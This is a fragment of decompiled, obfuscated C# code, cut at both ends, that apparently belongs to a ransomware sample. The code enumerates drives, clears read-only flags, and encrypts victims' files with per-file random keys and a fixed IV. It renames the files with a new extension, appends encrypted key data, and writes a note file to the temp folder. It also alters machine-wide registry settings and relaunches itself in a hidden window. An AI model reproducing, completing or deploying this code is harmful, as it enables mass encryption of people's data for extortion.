				{
					registryKey.DeleteSubKey(HVpeMrZfkFlb(getString_0(107392468)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107392434)), HVpeMrZfkFlb(getString_0(107392449)));
			rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107392368)), HVpeMrZfkFlb(getString_0(107392391)));
			rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107392368)), HVpeMrZfkFlb(getString_0(107391701)));
			rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107391640)), HVpeMrZfkFlb(getString_0(107391655)));
		}
		catch
		{
		}
	}

	public static void AXWEfwzISuVXUHm(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(HVpeMrZfkFlb(getString_0(107392094)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void YwOPgndGpkrNn()
	{
		string string_ = wToEnzHBmDVrI(getString_0(107392069));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(HVpeMrZfkFlb(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(HVpeMrZfkFlb(getString_0(107391956)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void HJRcTLWrdpFl()
	{
		rCeUKIVeLnQH(getString_0(107397124), HVpeMrZfkFlb(getString_0(107391923)));
		string text = HVpeMrZfkFlb(getString_0(107391217));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107391152) + text + getString_0(107391152) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397124);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void rMoNmipxFkKw(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (TiKXhRWKbmQI)
			{
				try
				{
					File.AppendAllText(NPfFzxrRnHyw, getString_0(107391179) + string_0 + getString_0(107391170) + ex.Message + getString_0(107396585));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string HqqBLCvmqImsbDmo()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107393277);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107391593);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107391104))) ? getString_0(107391566) : getString_0(107391575));
				break;
			case 0:
				text = getString_0(107391109);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107391588);
				break;
			case 4:
				text = getString_0(107391543);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107391557) : getString_0(107391534));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107391501) : getString_0(107391506)) : getString_0(107391511)) : getString_0(107391552));
				break;
			case 10:
				text = getString_0(107391528);
				break;
			}
		}
		if (text != getString_0(107393277))
		{
			text = getString_0(107391523) + text;
			if (oSVersion.ServicePack != getString_0(107393277))
			{
				text = text + getString_0(107391478) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string kHOxNQVfWOWR(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395566);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(HVpeMrZfkFlb(getString_0(107395533)));
				streamWriter.WriteLine(getString_0(107396585));
				streamWriter.WriteLine(HVpeMrZfkFlb(getString_0(107393711)));
				streamWriter.WriteLine(string_0);
				if (hpyULordzdhq)
				{
					streamWriter.WriteLine(getString_0(107396585));
					streamWriter.WriteLine(HVpeMrZfkFlb(getString_0(107394145)));
					streamWriter.WriteLine(OoPMqxzMoPT.TuxvCREHhgWfT());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !hWWikjLPcgd)
				{
					File.AppendAllText(text, getString_0(107394112) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (TiKXhRWKbmQI)
			{
				try
				{
					File.AppendAllText(NPfFzxrRnHyw, getString_0(107391473) + ex.Message + getString_0(107396585));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void axpZytzHzcpnz(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		OyvbXAvPuKBZVsBq.OaASIlSustKwI CS_0024_003C_003E8__locals0 = new OyvbXAvPuKBZVsBq();
		CS_0024_003C_003E8__locals0.FVlFTfmMNpdfGh = string_1;
		CS_0024_003C_003E8__locals0.OGgGQsTqBlBCq = string_2;
		CS_0024_003C_003E8__locals0.xZOUbJihRtwSVFky = string_3;
		CS_0024_003C_003E8__locals0.RBBUEzhzLAxiwSKT = string_4;
		GNzSmqEhxfDdOM = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.xZOUbJihRtwSVFky);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107391416))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !HvDislcBmvfwEiZ.Contains(array[i].Name))
					{
						HvDislcBmvfwEiZ.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!HvDislcBmvfwEiZ.Contains(string_0[j]))
				{
					HvDislcBmvfwEiZ.Add(string_0[j]);
				}
			}
		}
		if (HvDislcBmvfwEiZ.Contains(HVpeMrZfkFlb(getString_0(107391407))) && YsLgrKljrXrO == getString_0(107397207))
		{
			HvDislcBmvfwEiZ.Remove(HVpeMrZfkFlb(getString_0(107391407)));
		}
		Parallel.ForEach(HvDislcBmvfwEiZ, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new OyvbXAvPuKBZVsBq.OaASIlSustKwI();
			CS_0024_003C_003E8__locals0.BJKxASADiWzk = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.YLyBYIjSmFjlgi = string_0;
			if (YddgklTLPM && !HqqBLCvmqImsbDmo().Contains(OyvbXAvPuKBZVsBq.getString_0(107391566)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						dsPuSZignq(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.YLyBYIjSmFjlgi);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (yOLtwErlSIuUuw == OyvbXAvPuKBZVsBq.getString_0(107397216))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					iXotQZrDUUUCDA(CS_0024_003C_003E8__locals0.YLyBYIjSmFjlgi, CS_0024_003C_003E8__locals0.BJKxASADiWzk.FVlFTfmMNpdfGh, CS_0024_003C_003E8__locals0.BJKxASADiWzk.RBBUEzhzLAxiwSKT, CS_0024_003C_003E8__locals0.BJKxASADiWzk.OGgGQsTqBlBCq, CS_0024_003C_003E8__locals0.BJKxASADiWzk.xZOUbJihRtwSVFky);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				iXotQZrDUUUCDA(CS_0024_003C_003E8__locals0.YLyBYIjSmFjlgi, CS_0024_003C_003E8__locals0.FVlFTfmMNpdfGh, CS_0024_003C_003E8__locals0.RBBUEzhzLAxiwSKT, CS_0024_003C_003E8__locals0.OGgGQsTqBlBCq, CS_0024_003C_003E8__locals0.xZOUbJihRtwSVFky);
			}
		});
	}

	public static void iXotQZrDUUUCDA(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107393277));
		List<string> list3 = list2;
		if (HfkLRUwddBKMzY == getString_0(107396732))
		{
			list = nnwntDLyIr(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = BGiHVeGzZvpUqcy.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((rvXTXOXThUg == getString_0(107396732) && !item.EndsWith(text)) || fpmCyTaZQjAm.Contains(item))
				{
					continue;
				}
				if (LHgKOtaABYHh == getString_0(107397207))
				{
					try
					{
						if (IvkAlWvtyqMeDN.TEOwirmYyFAe(item))
						{
							IvkAlWvtyqMeDN.QvIJJaFwnlbV(item);
						}
					}
					catch
					{
					}
				}
				fpmCyTaZQjAm.Add(item);
				if (!RVpXhPaEOqMSkG.Contains(Path.GetDirectoryName(item)))
				{
					RVpXhPaEOqMSkG.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (hmJvpQlaOPxs == getString_0(107397207) && fileStream.Length > Convert.ToInt32(lULwGORTHsVbwb) * 1024 * 1024 && !list3.Contains(text))
					{
						if (uCcQuMnxchHHlJ == getString_0(107397207))
						{
							foreach (string item2 in ckZUdJlJosB)
							{
								if (item.ToLower().EndsWith(item2) && GpxsQQwDuqzSQU == getString_0(107397207))
								{
									if (Convert.ToInt32(ThgEusyzIrO) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											OoPMqxzMoPT.NtFcgKTCMrqXUSQ(getString_0(107393326), getString_0(107393353), getString_0(107393340), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && GpxsQQwDuqzSQU == getString_0(107396732))
								{
									try
									{
										OoPMqxzMoPT.NtFcgKTCMrqXUSQ(getString_0(107393326), getString_0(107393353), getString_0(107393340), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = LDPlsTBlRKl.SIHltLKinis(item, Convert.ToInt32(lULwGORTHsVbwb) * 1024 * 1024);
						byte[] qdqaaPMDvE = LDPlsTBlRKl.zJqyRuuOKNq(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						LDPlsTBlRKl.okTfVuvniFE(item, qdqaaPMDvE);
						if (string_2 != getString_0(107391430))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107391430))
					{
						orRipiqqQVNW(item, item + string_2, GNzSmqEhxfDdOM);
					}
					else
					{
						orRipiqqQVNW(item, item + getString_0(107391425), GNzSmqEhxfDdOM);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void KsRdrqFMQnbH(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		ILaHbrWVQTp.EXWrPuSgPDt CS_0024_003C_003E8__locals0 = new ILaHbrWVQTp();
		CS_0024_003C_003E8__locals0.sNGFtOfLZdgOwtG = list_0;
		CS_0024_003C_003E8__locals0.LUAEFZkwQdyp = string_1;
		CS_0024_003C_003E8__locals0.DdNdQPwYeQCU = string_2;
		CS_0024_003C_003E8__locals0.kXRqipnIRdWIwO = string_3;
		CS_0024_003C_003E8__locals0.idwOnWkgJvyiJfZcX = new List<string> { getString_0(107393277) };
		if (rvXTXOXThUg == getString_0(107396732))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.sNGFtOfLZdgOwtG)
				{
					if (CS_0024_003C_003E8__locals0.DdNdQPwYeQCU.Length != 0)
					{
						string[] ddNdQPwYeQCU2 = CS_0024_003C_003E8__locals0.DdNdQPwYeQCU;
						int num2 = 0;
						while (num2 < ddNdQPwYeQCU2.Length)
						{
							string value2 = ddNdQPwYeQCU2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_072e;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.LUAEFZkwQdyp))
						{
							goto IL_072e;
						}
					}
					catch (Exception)
					{
						goto IL_072e;
					}
					if (item.EndsWith(string_0) && !fpmCyTaZQjAm.Contains(item))
					{
						if (LHgKOtaABYHh == ILaHbrWVQTp.getString_0(107397224))
						{
							try
							{
								if (IvkAlWvtyqMeDN.TEOwirmYyFAe(item))
								{
									IvkAlWvtyqMeDN.QvIJJaFwnlbV(item);
								}
							}
							catch
							{
							}
						}
						fpmCyTaZQjAm.Add(item);
						if (!RVpXhPaEOqMSkG.Contains(Path.GetDirectoryName(item)))
						{
							RVpXhPaEOqMSkG.Add(Path.GetDirectoryName(item));
						}
						rMoNmipxFkKw(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ee;
								}
								goto end_IL_00ee_2;
								end_IL_00ee:;
							}
							catch (Exception ex12)
							{
								if (TiKXhRWKbmQI)
								{
									try
									{
										File.AppendAllText(NPfFzxrRnHyw, ILaHbrWVQTp.getString_0(107391196) + item + ILaHbrWVQTp.getString_0(107408835) + ex12.Message + ILaHbrWVQTp.getString_0(107396602));
									}
									catch (Exception)
									{
									}
								}
								bVOffGsglMxM++;
								goto end_IL_00ee_2;
							}
							if (hmJvpQlaOPxs == ILaHbrWVQTp.getString_0(107397224) && new FileInfo(item).Length > Convert.ToInt32(lULwGORTHsVbwb) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.idwOnWkgJvyiJfZcX.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new ILaHbrWVQTp.SCEyazWNHIl();
								CS_0024_003C_003E8__locals0.TWYyHIKfojzLa = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.LUAEFZkwQdyp != ILaHbrWVQTp.getString_0(107391447))
									{
										if (hpyULordzdhq)
										{
											CS_0024_003C_003E8__locals0.LUAEFZkwQdyp = UMHyeHuFiQnSyQ + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp);
									}
								}
								catch (Exception ex14)
								{
									if (TiKXhRWKbmQI)
									{
										try
										{
											File.AppendAllText(NPfFzxrRnHyw, ILaHbrWVQTp.getString_0(107391196) + item + ILaHbrWVQTp.getString_0(107408774) + ex14.Message + ILaHbrWVQTp.getString_0(107396602));
										}
										catch (Exception)
										{
										}
									}
									bVOffGsglMxM++;
									goto end_IL_00ee_2;
								}
								CS_0024_003C_003E8__locals0.OlRLvdUaawOGm = ILaHbrWVQTp.getString_0(107393294);
								if (CS_0024_003C_003E8__locals0.LUAEFZkwQdyp != ILaHbrWVQTp.getString_0(107391447))
								{
									CS_0024_003C_003E8__locals0.OlRLvdUaawOGm = item + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp;
								}
								else
								{
									CS_0024_003C_003E8__locals0.OlRLvdUaawOGm = item;
								}
								if (uCcQuMnxchHHlJ == ILaHbrWVQTp.getString_0(107397224))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in ckZUdJlJosB)
										{
											if (CS_0024_003C_003E8__locals0.OlRLvdUaawOGm.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.TWYyHIKfojzLa.LUAEFZkwQdyp) && GpxsQQwDuqzSQU == ILaHbrWVQTp.SCEyazWNHIl.getString_0(107397227))
											{
												if (Convert.ToInt32(ThgEusyzIrO) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.OlRLvdUaawOGm).Length)
												{
													try
													{
														OoPMqxzMoPT.NtFcgKTCMrqXUSQ(ILaHbrWVQTp.SCEyazWNHIl.getString_0(107393346), ILaHbrWVQTp.SCEyazWNHIl.getString_0(107393373), ILaHbrWVQTp.SCEyazWNHIl.getString_0(107393360), CS_0024_003C_003E8__locals0.OlRLvdUaawOGm);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.OlRLvdUaawOGm.ToLower().EndsWith(item2) && GpxsQQwDuqzSQU == ILaHbrWVQTp.SCEyazWNHIl.getString_0(107396752))
											{
												try
												{
													OoPMqxzMoPT.NtFcgKTCMrqXUSQ(ILaHbrWVQTp.SCEyazWNHIl.getString_0(107393346), ILaHbrWVQTp.SCEyazWNHIl.getString_0(107393373), ILaHbrWVQTp.SCEyazWNHIl.getString_0(107393360), CS_0024_003C_003E8__locals0.OlRLvdUaawOGm);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = lRoqoMlYxFS.qYRjRODTFgsABsxV(32);
								string s3 = SwirPclUHWNCec.RAWIZpYvlBsHh(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = LDPlsTBlRKl.SIHltLKinis(CS_0024_003C_003E8__locals0.OlRLvdUaawOGm, Convert.ToInt32(lULwGORTHsVbwb) * 1024 * 1024);
								LDPlsTBlRKl.okTfVuvniFE(QdqaaPMDvE: (!aMtbjENTlvGs) ? (hWWikjLPcgd ? LDPlsTBlRKl.zJqyRuuOKNq(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : LDPlsTBlRKl.zJqyRuuOKNq(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.kXRqipnIRdWIwO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (hWWikjLPcgd ? XiKgJtUmrYMpicU.iYGTeDkvafUG(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : XiKgJtUmrYMpicU.iYGTeDkvafUG(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.kXRqipnIRdWIwO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), jOuMeXrLMdE: CS_0024_003C_003E8__locals0.OlRLvdUaawOGm, WchFjUVPKuFtkL: bytes3);
							}
							else
							{
								if (hpyULordzdhq)
								{
									CS_0024_003C_003E8__locals0.LUAEFZkwQdyp = UMHyeHuFiQnSyQ + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp;
								}
								string text4 = lRoqoMlYxFS.qYRjRODTFgsABsxV(32);
								string s4 = SwirPclUHWNCec.RAWIZpYvlBsHh(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.LUAEFZkwQdyp != ILaHbrWVQTp.getString_0(107391447))
								{
									if (!FwNVRjoRuJX)
									{
										if (!hWWikjLPcgd)
										{
											CPTiJxEiqbG(item, item + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp, GNzSmqEhxfDdOM);
										}
										else
										{
											CPTiJxEiqbG(item, item + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!hWWikjLPcgd)
											{
												WxPAFRGwcjiPOHT(item, item + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp, GNzSmqEhxfDdOM);
											}
											else
											{
												WxPAFRGwcjiPOHT(item, item + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (TiKXhRWKbmQI)
											{
												try
												{
													File.AppendAllText(NPfFzxrRnHyw, ILaHbrWVQTp.getString_0(107391196) + item + ILaHbrWVQTp.getString_0(107391401) + ex16.Message + ILaHbrWVQTp.getString_0(107396602));
												}
												catch (Exception)
												{
												}
											}
											bVOffGsglMxM++;
											goto end_IL_00ee_2;
										}
									}
								}
								else if (!FwNVRjoRuJX)
								{
									if (!hWWikjLPcgd)
									{
										CPTiJxEiqbG(item, item + ILaHbrWVQTp.getString_0(107391442), GNzSmqEhxfDdOM);
									}
									else
									{
										CPTiJxEiqbG(item, item + ILaHbrWVQTp.getString_0(107391442), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!hWWikjLPcgd)
										{
											WxPAFRGwcjiPOHT(item, item, GNzSmqEhxfDdOM);
										}
										else
										{
											WxPAFRGwcjiPOHT(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (TiKXhRWKbmQI)
										{
											try
											{
												File.AppendAllText(NPfFzxrRnHyw, ILaHbrWVQTp.getString_0(107391196) + item + ILaHbrWVQTp.getString_0(107391401) + ex18.Message + ILaHbrWVQTp.getString_0(107396602));
											}
											catch (Exception)
											{
											}
										}
										bVOffGsglMxM++;
										goto end_IL_00ee_2;
									}
								}
								if (hWWikjLPcgd)
								{
									if (CS_0024_003C_003E8__locals0.LUAEFZkwQdyp != ILaHbrWVQTp.getString_0(107391447))
									{
										AXWEfwzISuVXUHm(item + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp, bytes4);
									}
									else
									{
										AXWEfwzISuVXUHm(item, bytes4);
									}
								}
							}
							goto IL_072e;
							end_IL_00ee_2:;
						}
						catch (Exception)
						{
							goto IL_072e;
						}
					}
					continue;
					IL_072e:
					CS_0024_003C_003E8__locals0.sNGFtOfLZdgOwtG.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.sNGFtOfLZdgOwtG, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new ILaHbrWVQTp.EXWrPuSgPDt();
			CS_0024_003C_003E8__locals0.TWYyHIKfojzLa = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.THbMIWrcVCD = string_0;
			if (CS_0024_003C_003E8__locals0.DdNdQPwYeQCU.Length != 0)
			{
				string[] ddNdQPwYeQCU = CS_0024_003C_003E8__locals0.DdNdQPwYeQCU;
				int num = 0;
				while (num < ddNdQPwYeQCU.Length)
				{
					string value = ddNdQPwYeQCU[num];
					if (!CS_0024_003C_003E8__locals0.THbMIWrcVCD.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.THbMIWrcVCD.EndsWith(CS_0024_003C_003E8__locals0.LUAEFZkwQdyp))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!fpmCyTaZQjAm.Contains(CS_0024_003C_003E8__locals0.THbMIWrcVCD))
			{
				if (LHgKOtaABYHh == ILaHbrWVQTp.getString_0(107397224))
				{
					try
					{
						if (IvkAlWvtyqMeDN.TEOwirmYyFAe(CS_0024_003C_003E8__locals0.THbMIWrcVCD))
						{
							IvkAlWvtyqMeDN.QvIJJaFwnlbV(CS_0024_003C_003E8__locals0.THbMIWrcVCD);
						}
					}
					catch
					{
					}
				}
				fpmCyTaZQjAm.Add(CS_0024_003C_003E8__locals0.THbMIWrcVCD);
				if (!RVpXhPaEOqMSkG.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.THbMIWrcVCD)))
				{
					RVpXhPaEOqMSkG.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.THbMIWrcVCD));
				}
				rMoNmipxFkKw(CS_0024_003C_003E8__locals0.THbMIWrcVCD);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.THbMIWrcVCD).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (TiKXhRWKbmQI)
						{
							try
							{
								File.AppendAllText(NPfFzxrRnHyw, ILaHbrWVQTp.getString_0(107391196) + CS_0024_003C_003E8__locals0.THbMIWrcVCD + ILaHbrWVQTp.getString_0(107408835) + ex2.Message + ILaHbrWVQTp.getString_0(107396602));
							}
							catch (Exception)
							{
							}
						}
						bVOffGsglMxM++;
						goto end_IL_0117_2;
					}
					if (hmJvpQlaOPxs == ILaHbrWVQTp.getString_0(107397224) && new FileInfo(CS_0024_003C_003E8__locals0.THbMIWrcVCD).Length > Convert.ToInt32(lULwGORTHsVbwb) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.LUAEFZkwQdyp != ILaHbrWVQTp.getString_0(107391447))
							{
								if (hpyULordzdhq)
								{
									CS_0024_003C_003E8__locals0.LUAEFZkwQdyp = UMHyeHuFiQnSyQ + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp;
								}
								File.Move(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp);
							}
						}
						catch (Exception ex4)
						{
							if (TiKXhRWKbmQI)
							{
								try
								{
									File.AppendAllText(NPfFzxrRnHyw, ILaHbrWVQTp.getString_0(107391196) + CS_0024_003C_003E8__locals0.THbMIWrcVCD + ILaHbrWVQTp.getString_0(107408774) + ex4.Message + ILaHbrWVQTp.getString_0(107396602));
								}
								catch (Exception)
								{
								}
							}
							bVOffGsglMxM++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.LUAEFZkwQdyp != ILaHbrWVQTp.getString_0(107391447))
						{
							CS_0024_003C_003E8__locals0.THbMIWrcVCD += CS_0024_003C_003E8__locals0.LUAEFZkwQdyp;
						}
						if (uCcQuMnxchHHlJ == ILaHbrWVQTp.getString_0(107397224))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in ckZUdJlJosB)
								{
									if (CS_0024_003C_003E8__locals0.THbMIWrcVCD.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.TWYyHIKfojzLa.LUAEFZkwQdyp) && GpxsQQwDuqzSQU == ILaHbrWVQTp.EXWrPuSgPDt.getString_0(107397230))
									{
										if (Convert.ToInt32(ThgEusyzIrO) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.THbMIWrcVCD).Length)
										{
											try
											{
												OoPMqxzMoPT.NtFcgKTCMrqXUSQ(ILaHbrWVQTp.EXWrPuSgPDt.getString_0(107393349), ILaHbrWVQTp.EXWrPuSgPDt.getString_0(107393376), ILaHbrWVQTp.EXWrPuSgPDt.getString_0(107393363), CS_0024_003C_003E8__locals0.THbMIWrcVCD);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.THbMIWrcVCD.ToLower().EndsWith(item3) && GpxsQQwDuqzSQU == ILaHbrWVQTp.EXWrPuSgPDt.getString_0(107396755))
									{
										try
										{
											OoPMqxzMoPT.NtFcgKTCMrqXUSQ(ILaHbrWVQTp.EXWrPuSgPDt.getString_0(107393349), ILaHbrWVQTp.EXWrPuSgPDt.getString_0(107393376), ILaHbrWVQTp.EXWrPuSgPDt.getString_0(107393363), CS_0024_003C_003E8__locals0.THbMIWrcVCD);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = lRoqoMlYxFS.qYRjRODTFgsABsxV(32);
						string s = SwirPclUHWNCec.RAWIZpYvlBsHh(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = LDPlsTBlRKl.SIHltLKinis(CS_0024_003C_003E8__locals0.THbMIWrcVCD, Convert.ToInt32(lULwGORTHsVbwb) * 1024 * 1024);
						LDPlsTBlRKl.okTfVuvniFE(QdqaaPMDvE: (!aMtbjENTlvGs) ? (hWWikjLPcgd ? LDPlsTBlRKl.zJqyRuuOKNq(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : LDPlsTBlRKl.zJqyRuuOKNq(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.kXRqipnIRdWIwO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (hWWikjLPcgd ? XiKgJtUmrYMpicU.iYGTeDkvafUG(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : XiKgJtUmrYMpicU.iYGTeDkvafUG(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.kXRqipnIRdWIwO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), jOuMeXrLMdE: CS_0024_003C_003E8__locals0.THbMIWrcVCD, WchFjUVPKuFtkL: bytes);
					}
					else
					{
						if (hpyULordzdhq)
						{
							CS_0024_003C_003E8__locals0.LUAEFZkwQdyp = UMHyeHuFiQnSyQ + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp;
						}
						string text2 = lRoqoMlYxFS.qYRjRODTFgsABsxV(32);
						string s2 = SwirPclUHWNCec.RAWIZpYvlBsHh(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.LUAEFZkwQdyp != ILaHbrWVQTp.getString_0(107391447))
						{
							if (!FwNVRjoRuJX)
							{
								if (!hWWikjLPcgd)
								{
